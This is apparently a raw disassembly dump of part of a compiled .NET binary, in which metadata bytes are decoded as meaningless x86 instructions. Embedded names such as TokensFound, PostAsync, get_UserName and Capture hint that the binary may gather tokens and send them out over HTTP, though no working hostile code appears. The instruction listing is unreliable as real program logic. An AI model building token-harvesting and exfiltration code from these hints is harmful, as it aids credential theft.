  4025cf:	03 50 00             	add    0x0(%eax),%edx
  4025d2:	06                   	push   %es
  4025d3:	00 44 04 6c          	add    %al,0x6c(%esp,%eax,1)
  4025d7:	05 0a 00 49 03       	add    $0x349000a,%eax
  4025dc:	4d                   	dec    %ebp
  4025dd:	05 06 00 03 01       	add    $0x1030006,%eax
  4025e2:	9a 03 53 00 53 04 00 	lcall  $0x4,$0x53005303
  4025e9:	00 0e                	add    %cl,(%esi)
  4025eb:	00 a0 05 e4 03 06    	add    %ah,0x603e405(%eax)
  4025f1:	00 3a                	add    %bh,(%edx)
  4025f3:	00 63 00             	add    %ah,0x0(%ebx)
  4025f6:	06                   	push   %es
  4025f7:	00 16                	add    %dl,(%esi)
  4025f9:	00 b5 04 0e 00 db    	add    %dh,-0x24fff1fc(%ebp)
  4025ff:	00 e4                	add    %ah,%ah
  402601:	03 06                	add    (%esi),%eax
  402603:	00 ab 05 9a 03 7f    	add    %ch,0x7f039a05(%ebx)
  402609:	00 27                	add    %ah,(%edi)
  40260b:	04 00                	add    $0x0,%al
  40260d:	00 06                	add    %al,(%esi)
  40260f:	00 42 03             	add    %al,0x3(%edx)
  402612:	9a 03 06 00 0f 04 50 	lcall  $0x5004,$0xf000603
  402619:	00 06                	add    %al,(%esi)
  40261b:	00 1c 04             	add    %bl,(%esp,%eax,1)
  40261e:	50                   	push   %eax
  40261f:	00 0a                	add    %cl,(%edx)
  402621:	00 27                	add    %ah,(%edi)
  402623:	06                   	push   %es
  402624:	4d                   	dec    %ebp
  402625:	05 0a 00 bd 03       	add    $0x3bd000a,%eax
  40262a:	4d                   	dec    %ebp
  40262b:	05 0a 00 3a 01       	add    $0x13a000a,%eax
  402630:	4d                   	dec    %ebp
  402631:	05 12 00 f8 00       	add    $0xf80012,%eax
  402636:	f4                   	hlt
  402637:	03 06                	add    (%esi),%eax
  402639:	00 01                	add    %al,(%ecx)
  40263b:	00 63 00             	add    %ah,0x0(%ebx)
  40263e:	0e                   	push   %cs
  40263f:	00 c3                	add    %al,%bl
  402641:	05 e4 03 06 00       	add    $0x603e4,%eax
  402646:	2b 00                	sub    (%eax),%eax
  402648:	63 00                	arpl   %eax,(%eax)
  40264a:	06                   	push   %es
  40264b:	00 0f                	add    %cl,(%edi)
  40264d:	00 1f                	add    %bl,(%edi)
  40264f:	05 0e 00 d9 05       	add    $0x5d9000e,%eax
  402654:	e4 03                	in     $0x3,%al
  402656:	00 00                	add    %al,(%eax)
  402658:	00 00                	add    %al,(%eax)
  40265a:	47                   	inc    %edi
  40265b:	00 00                	add    %al,(%eax)
  40265d:	00 00                	add    %al,(%eax)
  40265f:	00 01                	add    %al,(%ecx)
  402661:	00 01                	add    %al,(%ecx)
  402663:	00 81 01 10 00 07    	add    %al,0x7001001(%ecx)
  402669:	04 00                	add    $0x0,%al
  40266b:	04 41                	add    $0x41,%al
  40266d:	00 01                	add    %al,(%ecx)
  40266f:	00 01                	add    %al,(%ecx)
  402671:	00 00                	add    %al,(%eax)
  402673:	00 10                	add    %dl,(%eax)
  402675:	00 80 03 00 04 41    	add    %al,0x41040003(%eax)
  40267b:	00 02                	add    %al,(%edx)
  40267d:	00 04 00             	add    %al,(%eax,%eax,1)
  402680:	01 00                	add    %eax,(%eax)
  402682:	10 00                	adc    %al,(%eax)
  402684:	d3 00                	roll   %cl,(%eax)
  402686:	00 04 41             	add    %al,(%ecx,%eax,2)
  402689:	00 04 00             	add    %al,(%eax,%eax,1)
  40268c:	07                   	pop    %es
  40268d:	00 81 01 10 00 6f    	add    %al,0x6f001001(%ecx)
  402693:	03 00                	add    (%eax),%eax
  402695:	04 41                	add    $0x41,%al
  402697:	00 07                	add    %al,(%edi)
  402699:	00 09                	add    %cl,(%ecx)
  40269b:	00 11                	add    %dl,(%ecx)
  40269d:	00 8c 00 8e 01 16 00 	add    %cl,0x16018e(%eax,%eax,1)
  4026a4:	f6 05 91 01 31 00 d5 	testb  $0xd5,0x310191
  4026ab:	04 98                	add    $0x98,%al
  4026ad:	01 21                	add    %esp,(%ecx)
  4026af:	00 0f                	add    %cl,(%edi)
  4026b1:	01 a0 01 21 00 4f    	add    %esp,0x4f002101(%eax)
  4026b7:	03 a0 01 21 00 ff    	add    -0xffdeff(%eax),%esp
  4026bd:	04 8e                	add    $0x8e,%al
  4026bf:	01 31                	add    %esi,(%ecx)
  4026c1:	00 77 03             	add    %dh,0x3(%edi)
  4026c4:	a0 01 50 20 00       	mov    0x205001,%al
  4026c9:	00 00                	add    %al,(%eax)
  4026cb:	00 96 08 b3 00 a3    	add    %dl,-0x5cff4cf8(%esi)
  4026d1:	01 01                	add    %eax,(%ecx)
  4026d3:	00 57 20             	add    %dl,0x20(%edi)
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	91                   	xchg   %eax,%ecx
  4026db:	08 c3                	or     %al,%bl
  4026dd:	00 a7 01 01 00 60    	add    %ah,0x60000101(%edi)
  4026e3:	20 00                	and    %al,(%eax)
  4026e5:	00 00                	add    %al,(%eax)
  4026e7:	00 96 00 36 05 ac    	add    %dl,-0x53faca00(%esi)
  4026ed:	01 02                	add    %eax,(%edx)
  4026ef:	00 00                	add    %al,(%eax)
  4026f1:	22 00                	and    (%eax),%al
  4026f3:	00 00                	add    %al,(%eax)
  4026f5:	00 91 00 a1 03 b6    	add    %dl,-0x49fc5f00(%ecx)
  4026fb:	01 04 00             	add    %eax,(%eax,%eax,1)
  4026fe:	6c                   	insb   (%dx),%es:(%edi)
  4026ff:	22 00                	and    (%eax),%al
  402701:	00 00                	add    %al,(%eax)
  402703:	00 86 18 76 04 06    	add    %al,0x6047618(%esi)
  402709:	00 05 00 78 22 00    	add    %al,0x227800
  40270f:	00 00                	add    %al,(%eax)
  402711:	00 91 18 7c 04 bc    	add    %dl,-0x43fb83e8(%ecx)
  402717:	01 05 00 3a 23 00    	add    %eax,0x233a00
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 86 18 76 04 c0    	add    %al,-0x3ffb89e8(%esi)
  402725:	01 05 00 5c 23 00    	add    %eax,0x235c00
  40272b:	00 00                	add    %al,(%eax)
  40272d:	00 86 00 36 05 06    	add    %al,0x6053600(%esi)
  402733:	00 08                	add    %cl,(%eax)
  402735:	00 b4 23 00 00 00 00 	add    %dh,0x0(%ebx,%eiz,1)
  40273c:	96                   	xchg   %eax,%esi
  40273d:	00 40 05             	add    %al,0x5(%eax)
  402740:	c7 01 08 00 70 24    	movl   $0x24700008,(%ecx)
  402746:	00 00                	add    %al,(%eax)
  402748:	00 00                	add    %al,(%eax)
  40274a:	91                   	xchg   %eax,%ecx
  40274b:	18 7c 04 bc          	sbb    %bh,-0x44(%esp,%eax,1)
  40274f:	01 09                	add    %ecx,(%ecx)
  402751:	00 00                	add    %al,(%eax)
  402753:	00 01                	add    %al,(%ecx)
  402755:	00 06                	add    %al,(%esi)
  402757:	03 00                	add    (%eax),%eax
  402759:	00 01                	add    %al,(%ecx)
  40275b:	00 40 04             	add    %al,0x4(%eax)
  40275e:	10 10                	adc    %dl,(%eax)
  402760:	02 00                	add    (%eax),%al
  402762:	0b 05 00 00 01 00    	or     0x10000,%eax
  402768:	1a 05 00 00 01 00    	sbb    0x10000,%al
  40276e:	29 01                	sub    %eax,(%ecx)
  402770:	00 00                	add    %al,(%eax)
  402772:	02 00                	add    (%eax),%al
  402774:	6a 03                	push   $0x3
  402776:	10 10                	adc    %dl,(%eax)
  402778:	03 00                	add    (%eax),%eax
  40277a:	15 05 00 00 01       	adc    $0x1000005,%eax
  40277f:	00 02                	add    %al,(%edx)
  402781:	06                   	push   %es
  402782:	09 00                	or     %eax,(%eax)
  402784:	76 04                	jbe    0x40278a
  402786:	01 00                	add    %eax,(%eax)
  402788:	11 00                	adc    %eax,(%eax)
  40278a:	76 04                	jbe    0x402790
  40278c:	06                   	push   %es
  40278d:	00 19                	add    %bl,(%ecx)
  40278f:	00 76 04             	add    %dh,0x4(%esi)
  402792:	0a 00                	or     (%eax),%al
  402794:	29 00                	sub    %eax,(%eax)
  402796:	76 04                	jbe    0x40279c
  402798:	10 00                	adc    %al,(%eax)
  40279a:	31 00                	xor    %eax,(%eax)
  40279c:	76 04                	jbe    0x4027a2
  40279e:	10 00                	adc    %al,(%eax)
  4027a0:	39 00                	cmp    %eax,(%eax)
  4027a2:	76 04                	jbe    0x4027a8
  4027a4:	10 00                	adc    %al,(%eax)
  4027a6:	41                   	inc    %ecx
  4027a7:	00 76 04             	add    %dh,0x4(%esi)
  4027aa:	10 00                	adc    %al,(%eax)
  4027ac:	49                   	dec    %ecx
  4027ad:	00 76 04             	add    %dh,0x4(%esi)
  4027b0:	10 00                	adc    %al,(%eax)
  4027b2:	51                   	push   %ecx
  4027b3:	00 76 04             	add    %dh,0x4(%esi)
  4027b6:	10 00                	adc    %al,(%eax)
  4027b8:	59                   	pop    %ecx
  4027b9:	00 76 04             	add    %dh,0x4(%esi)
  4027bc:	10 00                	adc    %al,(%eax)
  4027be:	61                   	popa
  4027bf:	00 76 04             	add    %dh,0x4(%esi)
  4027c2:	15 00 69 00 76       	adc    $0x76006900,%eax
  4027c7:	04 10                	add    $0x10,%al
  4027c9:	00 71 00             	add    %dh,0x0(%ecx)
  4027cc:	76 04                	jbe    0x4027d2
  4027ce:	10 00                	adc    %al,(%eax)
  4027d0:	79 00                	jns    0x4027d2
  4027d2:	76 04                	jbe    0x4027d8
  4027d4:	10 00                	adc    %al,(%eax)
  4027d6:	89 00                	mov    %eax,(%eax)
  4027d8:	76 04                	jbe    0x4027de
  4027da:	06                   	push   %es
  4027db:	00 99 00 76 04 1a    	add    %bl,0x1a047600(%ecx)
  4027e1:	00 f9                	add    %bh,%cl
  4027e3:	00 5c 03 47          	add    %bl,0x47(%ebx,%eax,1)
  4027e7:	00 09                	add    %cl,(%ecx)
  4027e9:	01 7f 05             	add    %edi,0x5(%edi)
  4027ec:	4e                   	dec    %esi
  4027ed:	00 a9 00 76 04 10    	add    %ch,0x10047600(%ecx)
  4027f3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4027f6:	76 04                	jbe    0x4027fc
  4027f8:	06                   	push   %es
  4027f9:	00 a9 00 f6 04 5c    	add    %ch,0x5c04f600(%ecx)
  4027ff:	00 b1 00 1e 06 63    	add    %dh,0x63061e00(%ecx)
  402805:	00 19                	add    %bl,(%ecx)
  402807:	01 a9 00 69 00 21    	add    %ebp,0x21006900(%ecx)
  40280d:	01 ee                	add    %ebp,%esi
  40280f:	04 6d                	add    $0x6d,%al
  402811:	00 29                	add    %ch,(%ecx)
  402813:	01 50 04             	add    %edx,0x4(%eax)
  402816:	75 00                	jne    0x402818
  402818:	b9 00 b7 05 7a       	mov    $0x7a05b700,%ecx
  40281d:	00 31                	add    %dh,(%ecx)
  40281f:	01 fc                	add    %edi,%esp
  402821:	02 69 00             	add    0x0(%ecx),%ch
  402824:	0c 00                	or     $0x0,%al
  402826:	88 00                	mov    %al,(%eax)
  402828:	7e 00                	jle    0x40282a
  40282a:	b9 00 15 06 84       	mov    $0x84061500,%ecx
  40282f:	00 c9                	add    %cl,%cl
  402831:	00 42 01             	add    %al,0x1(%edx)
  402834:	06                   	push   %es
  402835:	00 39                	add    %bh,(%ecx)
  402837:	01 8d 05 88 00 39    	add    %ecx,0x39008805(%ebp)
  40283d:	01 0e                	add    %ecx,(%esi)
  40283f:	06                   	push   %es
  402840:	9e                   	sahf
  402841:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402844:	e5 05                	in     $0x5,%eax
  402846:	af                   	scas   %es:(%edi),%eax
  402847:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40284a:	88 03                	mov    %al,(%ebx)
  40284c:	b3 00                	mov    $0x0,%bl
  40284e:	09 01                	or     %eax,(%ecx)
  402850:	7f 05                	jg     0x402857
  402852:	b9 00 0c 00 91       	mov    $0x91000c00,%ecx
  402857:	03 bf 00 14 00 50    	add    0x50001400(%edi),%edi
  40285d:	04 d9                	add    $0xd9,%al
  40285f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402862:	b7 05                	mov    $0x5,%bh
  402864:	e9 00 1c 00 15       	jmp    0x15404469
  402869:	06                   	push   %es
  40286a:	84 00                	test   %al,(%eax)
  40286c:	81 00 76 04 06 00    	addl   $0x60476,(%eax)
  402872:	14 00                	adc    $0x0,%al
  402874:	76 04                	jbe    0x40287a
  402876:	06                   	push   %es
  402877:	00 14 00             	add    %dl,(%eax,%eax,1)
  40287a:	88 00                	mov    %al,(%eax)
  40287c:	7e 00                	jle    0x40287e
  40287e:	09 01                	or     %eax,(%ecx)
  402880:	7f 05                	jg     0x402887
  402882:	f7 00 0c 00 ef 05    	testl  $0x5ef000c,(%eax)
  402888:	bf 00 0c 00 ef       	mov    $0xef000c00,%edi
  40288d:	00 fe                	add    %bh,%dh
  40288f:	00 d9                	add    %bl,%cl
  402891:	00 76 04             	add    %dh,0x4(%esi)
  402894:	06                   	push   %es
  402895:	00 24 00             	add    %ah,(%eax,%eax,1)
  402898:	76 04                	jbe    0x40289e
  40289a:	06                   	push   %es
  40289b:	00 f9                	add    %bh,%cl
  40289d:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4028a0:	27                   	daa
  4028a1:	01 09                	add    %ecx,(%ecx)
  4028a3:	01 a6 03 2b 01 09    	add    %esp,0x9012b03(%esi)
  4028a9:	01 7f 05             	add    %edi,0x5(%edi)
  4028ac:	36 01 24 00          	add    %esp,%ss:(%eax,%eax,1)
  4028b0:	88 00                	mov    %al,(%eax)
  4028b2:	3c 01                	cmp    $0x1,%al
  4028b4:	49                   	dec    %ecx
  4028b5:	01 76 04             	add    %esi,0x4(%esi)
  4028b8:	44                   	inc    %esp
  4028b9:	01 d9                	add    %ebx,%ecx
  4028bb:	00 7e 00             	add    %bh,0x0(%esi)
  4028be:	54                   	push   %esp
  4028bf:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  4028c2:	35 04 6a 01 34       	xor    $0x34016a04,%eax
  4028c7:	00 96 05 e9 00 02    	add    %dl,0x200e905(%esi)
  4028cd:	00 0d 00 8c 01 02    	add    %cl,0x2018c00
  4028d3:	00 1d 00 8c 01 20    	add    %bl,0x20018c00
  4028d9:	00 7b 00             	add    %bh,0x0(%ebx)
  4028dc:	48                   	dec    %eax
  4028dd:	03 21                	add    (%ecx),%esp
  4028df:	00 7b 00             	add    %bh,0x0(%ebx)
  4028e2:	48                   	dec    %eax
  4028e3:	03 21                	add    (%ecx),%esp
  4028e5:	00 83 00 4d 03 2e    	add    %al,0x2e034d00(%ebx)
  4028eb:	00 0b                	add    %cl,(%ebx)
  4028ed:	00 d4                	add    %dl,%ah
  4028ef:	01 2e                	add    %ebp,(%esi)
  4028f1:	00 13                	add    %dl,(%ebx)
  4028f3:	00 dd                	add    %bl,%ch
  4028f5:	01 2e                	add    %ebp,(%esi)
  4028f7:	00 1b                	add    %bl,(%ebx)
  4028f9:	00 fc                	add    %bh,%ah
  4028fb:	01 2e                	add    %ebp,(%esi)
  4028fd:	00 23                	add    %ah,(%ebx)
  4028ff:	00 05 02 2e 00 2b    	add    %al,0x2b002e02
  402905:	00 2c 02             	add    %ch,(%edx,%eax,1)
  402908:	2e 00 33             	add    %dh,%cs:(%ebx)
  40290b:	00 5d 02             	add    %bl,0x2(%ebp)
  40290e:	2e 00 3b             	add    %bh,%cs:(%ebx)
  402911:	00 63 02             	add    %ah,0x2(%ebx)
  402914:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  402918:	80 02 2e             	addb   $0x2e,(%edx)
  40291b:	00 4b 00             	add    %cl,0x0(%ebx)
  40291e:	9d                   	popf
  40291f:	02 2e                	add    (%esi),%ch
  402921:	00 53 00             	add    %dl,0x0(%ebx)
  402924:	bb 02 2e 00 5b       	mov    $0x5b002e02,%ebx
  402929:	00 5d 02             	add    %bl,0x2(%ebp)
  40292c:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  402930:	c7 02 2e 00 6b 00    	movl   $0x6b002e,(%edx)
  402936:	f1                   	int1
  402937:	02 2e                	add    (%esi),%ch
  402939:	00 73 00             	add    %dh,0x0(%ebx)
  40293c:	fe 02                	incb   (%edx)
  40293e:	40                   	inc    %eax
  40293f:	00 7b 00             	add    %bh,0x0(%ebx)
  402942:	48                   	dec    %eax
  402943:	03 20                	add    (%eax),%esp
  402945:	00 c6                	add    %al,%dh
  402947:	00 ee                	add    %ch,%dh
  402949:	00 09                	add    %cl,(%ecx)
  40294b:	01 02                	add    %eax,(%edx)
  40294d:	00 01                	add    %al,(%ecx)
  40294f:	00 00                	add    %al,(%eax)
  402951:	00 c7                	add    %al,%bh
  402953:	00 d0                	add    %dl,%al
  402955:	01 02                	add    %eax,(%edx)
  402957:	00 01                	add    %al,(%ecx)
  402959:	00 03                	add    %al,(%ebx)
  40295b:	00 01                	add    %al,(%ecx)
  40295d:	00 02                	add    %al,(%edx)
  40295f:	00 03                	add    %al,(%ebx)
  402961:	00 56 00             	add    %dl,0x0(%esi)
  402964:	d2 00                	rolb   %cl,(%eax)
  402966:	e2 00                	loop   0x402968
  402968:	20 01                	and    %al,(%ecx)
  40296a:	62 01                	bound  %eax,(%ecx)
  40296c:	73 01                	jae    0x40296f
  40296e:	04 80                	add    $0x80,%al
  402970:	00 00                	add    %al,(%eax)
  402972:	05 00 02 00 01       	add    $0x1000200,%eax
  402977:	00 01                	add    %al,(%ecx)
  402979:	00 00                	add    %al,(%eax)
  40297b:	00 00                	add    %al,(%eax)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	00 5e 04             	add    %bl,0x4(%esi)
  402982:	00 00                	add    %al,(%eax)
  402984:	04 00                	add    $0x0,%al
	...
  40298e:	00 00                	add    %al,(%eax)
  402990:	7a 01                	jp     0x402993
  402992:	5a                   	pop    %edx
  402993:	00 00                	add    %al,(%eax)
  402995:	00 00                	add    %al,(%eax)
  402997:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4029a2:	00 00                	add    %al,(%eax)
  4029a4:	7a 01                	jp     0x4029a7
  4029a6:	9a 03 00 00 00 00 04 	lcall  $0x400,$0x3
	...
  4029b5:	00 00                	add    %al,(%eax)
  4029b7:	00 83 01 e4 03 00    	add    %al,0x3e401(%ebx)
  4029bd:	00 00                	add    %al,(%eax)
  4029bf:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4029ca:	00 00                	add    %al,(%eax)
  4029cc:	7a 01                	jp     0x4029cf
  4029ce:	2e 01 00             	add    %eax,%cs:(%eax)
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	00 3f                	add    %bh,(%edi)
  4029d5:	00 9a 00 41 00 9a    	add    %bl,-0x65ffbf00(%edx)
  4029db:	00 00                	add    %al,(%eax)
  4029dd:	00 00                	add    %al,(%eax)
  4029df:	00 00                	add    %al,(%eax)
  4029e1:	49                   	dec    %ecx
  4029e2:	45                   	inc    %ebp
  4029e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4029e4:	75 6d                	jne    0x402a53
  4029e6:	65 72 61             	gs jb  0x402a4a
  4029e9:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4029ed:	31 00                	xor    %eax,(%eax)
  4029ef:	54                   	push   %esp
  4029f0:	61                   	popa
  4029f1:	73 6b                	jae    0x402a5e
  4029f3:	60                   	pusha
  4029f4:	31 00                	xor    %eax,(%eax)
  4029f6:	54                   	push   %esp
  4029f7:	61                   	popa
  4029f8:	73 6b                	jae    0x402a65
  4029fa:	41                   	inc    %ecx
  4029fb:	77 61                	ja     0x402a5e
  4029fd:	69 74 65 72 60 31 00 	imul   $0x4c003160,0x72(%ebp,%eiz,2),%esi
  402a04:	4c 
  402a05:	69 73 74 60 31 00 4b 	imul   $0x4b003160,0x74(%ebx),%esi
  402a0c:	65 79 56             	gs jns 0x402a65
  402a0f:	61                   	popa
  402a10:	6c                   	insb   (%dx),%es:(%edi)
  402a11:	75 65                	jne    0x402a78
  402a13:	50                   	push   %eax
  402a14:	61                   	popa
  402a15:	69 72 60 32 00 44 69 	imul   $0x69440032,0x60(%edx),%esi
  402a1c:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  402a20:	6e                   	outsb  %ds:(%esi),(%dx)
  402a21:	61                   	popa
  402a22:	72 79                	jb     0x402a9d
  402a24:	60                   	pusha
  402a25:	32 00                	xor    (%eax),%al
  402a27:	3c 4d                	cmp    $0x4d,%al
  402a29:	6f                   	outsl  %ds:(%esi),(%dx)
  402a2a:	64 75 6c             	fs jne 0x402a99
  402a2d:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  402a32:	73 74                	jae    0x402aa8
  402a34:	65 6d                	gs insl (%dx),%es:(%edi)
  402a36:	2e 49                	cs dec %ecx
  402a38:	4f                   	dec    %edi
  402a39:	00 6d 73             	add    %ch,0x73(%ebp)
  402a3c:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402a3f:	6c                   	insb   (%dx),%es:(%edi)
  402a40:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  402a47:	65 6d                	gs insl (%dx),%es:(%edi)
  402a49:	2e 43                	cs inc %ebx
  402a4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4c:	6c                   	insb   (%dx),%es:(%edi)
  402a4d:	6c                   	insb   (%dx),%es:(%edi)
  402a4e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402a53:	6e                   	outsb  %ds:(%esi),(%dx)
  402a54:	73 2e                	jae    0x402a84
  402a56:	47                   	inc    %edi
  402a57:	65 6e                	outsb  %gs:(%esi),(%dx)
  402a59:	65 72 69             	gs jb  0x402ac5
  402a5c:	63 00                	arpl   %eax,(%eax)
  402a5e:	50                   	push   %eax
  402a5f:	6f                   	outsl  %ds:(%esi),(%dx)
  402a60:	73 74                	jae    0x402ad6
  402a62:	41                   	inc    %ecx
  402a63:	73 79                	jae    0x402ade
  402a65:	6e                   	outsb  %ds:(%esi),(%dx)
  402a66:	63 00                	arpl   %eax,(%eax)
  402a68:	41                   	inc    %ecx
  402a69:	64 64 00 3c 54       	fs add %bh,%fs:(%esp,%edx,2)
  402a6e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a6f:	6b 65 6e 73          	imul   $0x73,0x6e(%ebp),%esp
  402a73:	46                   	inc    %esi
  402a74:	6f                   	outsl  %ds:(%esi),(%dx)
  402a75:	75 6e                	jne    0x402ae5
  402a77:	64 3e 6b 5f 5f 42    	fs imul $0x42,%ds:0x5f(%edi),%ebx
  402a7d:	61                   	popa
  402a7e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  402a81:	6e                   	outsb  %ds:(%esi),(%dx)
  402a82:	67 46                	addr16 inc %esi
  402a84:	69 65 6c 64 00 52 65 	imul   $0x65520064,0x6c(%ebp),%esp
  402a8b:	61                   	popa
  402a8c:	64 54                	fs push %esp
  402a8e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a8f:	45                   	inc    %ebp
  402a90:	6e                   	outsb  %ds:(%esi),(%dx)
  402a91:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  402a95:	74 5f                	je     0x402af6
  402a97:	54                   	push   %esp
  402a98:	6f                   	outsl  %ds:(%esi),(%dx)
  402a99:	6b 65 6e 73          	imul   $0x73,0x6e(%ebp),%esp
  402a9d:	46                   	inc    %esi
  402a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a9f:	75 6e                	jne    0x402b0f
  402aa1:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  402aa5:	74 5f                	je     0x402b06
  402aa7:	54                   	push   %esp
  402aa8:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa9:	6b 65 6e 73          	imul   $0x73,0x6e(%ebp),%esp
  402aad:	46                   	inc    %esi
  402aae:	6f                   	outsl  %ds:(%esi),(%dx)
  402aaf:	75 6e                	jne    0x402b1f
  402ab1:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  402ab5:	72 76                	jb     0x402b2d
  402ab7:	69 63 65 00 48 74 74 	imul   $0x74744800,0x65(%ebx),%esp
  402abe:	70 52                	jo     0x402b12
  402ac0:	65 73 70             	gs jae 0x402b33
  402ac3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac4:	6e                   	outsb  %ds:(%esi),(%dx)
  402ac5:	73 65                	jae    0x402b2c
  402ac7:	4d                   	dec    %ebp
  402ac8:	65 73 73             	gs jae 0x402b3e
  402acb:	61                   	popa
  402acc:	67 65 00 41 64       	add    %al,%gs:0x64(%bx,%di)
  402ad1:	64 52                	fs push %edx
  402ad3:	61                   	popa
  402ad4:	6e                   	outsb  %ds:(%esi),(%dx)
  402ad5:	67 65 00 45 6e       	add    %al,%gs:0x6e(%di)
  402ada:	75 6d                	jne    0x402b49
  402adc:	65 72 61             	gs jb  0x402b40
  402adf:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  402ae3:	49                   	dec    %ecx
  402ae4:	44                   	inc    %esp
  402ae5:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  402aec:	6c                   	insb   (%dx),%es:(%edi)
  402aed:	65 00 5f 73          	add    %bl,%gs:0x73(%edi)
  402af1:	65 72 76             	gs jb  0x402b6a
  402af4:	69 63 65 4e 61 6d 65 	imul   $0x656d614e,0x65(%ebx),%esp
  402afb:	00 67 65             	add    %ah,0x65(%edi)
  402afe:	74 5f                	je     0x402b5f
  402b00:	55                   	push   %ebp
  402b01:	73 65                	jae    0x402b68
  402b03:	72 4e                	jb     0x402b53
  402b05:	61                   	popa
  402b06:	6d                   	insl   (%dx),%es:(%edi)
  402b07:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  402b0b:	6d                   	insl   (%dx),%es:(%edi)
  402b0c:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402b10:	73 74                	jae    0x402b86
  402b12:	65 6d                	gs insl (%dx),%es:(%edi)
  402b14:	2e 43                	cs inc %ebx
  402b16:	6f                   	outsl  %ds:(%esi),(%dx)
  402b17:	72 65                	jb     0x402b7e
  402b19:	00 43 61             	add    %al,0x61(%ebx)
  402b1c:	70 74                	jo     0x402b92
  402b1e:	75 72                	jne    0x402b92
  402b20:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  402b25:	70 6f                	jo     0x402b96
  402b27:	73 65                	jae    0x402b8e
  402b29:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  402b2d:	75 67                	jne    0x402b96
  402b2f:	67 65 72 42          	addr16 gs jb 0x402b75
  402b33:	72 6f                	jb     0x402ba4
  402b35:	77 73                	ja     0x402baa
  402b37:	61                   	popa
  402b38:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  402b3c:	74 61                	je     0x402b9f
  402b3e:	74 65                	je     0x402ba5
  402b40:	00 43 6f             	add    %al,0x6f(%ebx)
  402b43:	6d                   	insl   (%dx),%es:(%edi)
  402b44:	70 69                	jo     0x402baf
  402b46:	6c                   	insb   (%dx),%es:(%edi)
  402b47:	65 72 47             	gs jb  0x402b91
  402b4a:	65 6e                	outsb  %gs:(%esi),(%dx)
  402b4c:	65 72 61             	gs jb  0x402bb0
  402b4f:	74 65                	je     0x402bb6
  402b51:	64 41                	fs inc %ecx
  402b53:	74 74                	je     0x402bc9
  402b55:	72 69                	jb     0x402bc0
  402b57:	62 75 74             	bound  %esi,0x74(%ebp)
  402b5a:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  402b5e:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402b65:	62 
  402b66:	75 74                	jne    0x402bdc
  402b68:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402b6d:	75 67                	jne    0x402bd6
  402b6f:	67 61                	addr16 popa
  402b71:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402b75:	74 74                	je     0x402beb
  402b77:	72 69                	jb     0x402be2
  402b79:	62 75 74             	bound  %esi,0x74(%ebp)
  402b7c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402b81:	75 67                	jne    0x402bea
  402b83:	67 65 72 42          	addr16 gs jb 0x402bc9
  402b87:	72 6f                	jb     0x402bf8
  402b89:	77 73                	ja     0x402bfe
  402b8b:	61                   	popa
  402b8c:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402b90:	74 74                	je     0x402c06
  402b92:	72 69                	jb     0x402bfd
  402b94:	62 75 74             	bound  %esi,0x74(%ebp)
  402b97:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402b9b:	6d                   	insl   (%dx),%es:(%edi)
  402b9c:	56                   	push   %esi
  402b9d:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  402ba4:	74 74                	je     0x402c1a
  402ba6:	72 69                	jb     0x402c11
  402ba8:	62 75 74             	bound  %esi,0x74(%ebp)
  402bab:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402baf:	73 65                	jae    0x402c16
  402bb1:	6d                   	insl   (%dx),%es:(%edi)
  402bb2:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402bb6:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  402bbd:	72 
  402bbe:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402bc5:	73 73                	jae    0x402c3a
  402bc7:	65 6d                	gs insl (%dx),%es:(%edi)
  402bc9:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402bcd:	72 61                	jb     0x402c30
